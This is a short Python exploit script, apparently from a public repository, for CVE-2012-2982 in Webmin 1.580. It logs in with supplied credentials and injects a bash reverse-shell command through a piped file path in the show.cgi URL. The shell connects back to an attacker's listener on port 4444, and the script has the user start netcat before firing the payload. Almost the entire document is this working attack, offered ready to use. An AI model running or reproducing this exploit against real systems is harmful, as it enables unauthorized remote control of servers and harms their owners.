# CVE-2012-2982
# Vulnerable Software: Webmin 1.580
# Code Owner: https://github.com/Dawnn3619

# Modules
import requests
import time
import argparse

parser = argparse.ArgumentParser()

parser.add_argument("--target", required=True, help="Target IP Adress")
parser.add_argument("--username", required=True, help="Webmin Username")
parser.add_argument("--password", required=True, help="Webmin Password")
parser.add_argument("--lhost", required=True, help="Attacker IP Adress")

args = parser.parse_args()

# Vulnerable Host IP
TARGET_IP = args.target

# Vulnerable Web App Credentials
USERNAME = args.username
PASSWORD = args.password

# Attacker's IP and Port Attacker Listen 
LHOST = args.lhost
LPORT = 4444

# Reverse Shell Payload To Send Vulnerable Host 
payload = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"

# Login Request To Host With Identified Credentials
data = {
    'page' : "%2F",
    'user' : USERNAME,
    'pass' : PASSWORD
    }

# Host Login URL
login_url = f"http://{TARGET_IP}/session_login.cgi"

# Vulnerable URL
exploit_url = f"http://{TARGET_IP}/file/show.cgi/bin/aa2ff|{payload}|"

# HTTP Session
s = requests.session()

print(f"[*] Trying To Login As {USERNAME}...")

# Send Login Request To Host
r = s.post(login_url, data, cookies={"testing":"1"}, verify=False, allow_redirects=False)

# Check If Login Successful
if r.status_code == 302 and r.cookies["sid"] != None:
    print(f"[+] Logged In As {USERNAME} Trying To Execute Payload...")
else:
    print("[-] Login Error")
    quit()

# Ask Attacker To Set Listener
while True:
    ready = input(f"[*] Type 'ready' When You Started A NC Listener (nc -lvnp {LPORT}): ")
    if ready.lower() == "ready":
        print("\n[+] Executing Payload...")
        break
    else:
        print("\n[*] Type 'ready'")

# Send Exploit To Host
time.sleep(10)
print("[+] Pwned!")
exp_req = s.post(exploit_url, None, cookies={"testing":"1"}, verify=False, allow_redirects=False)
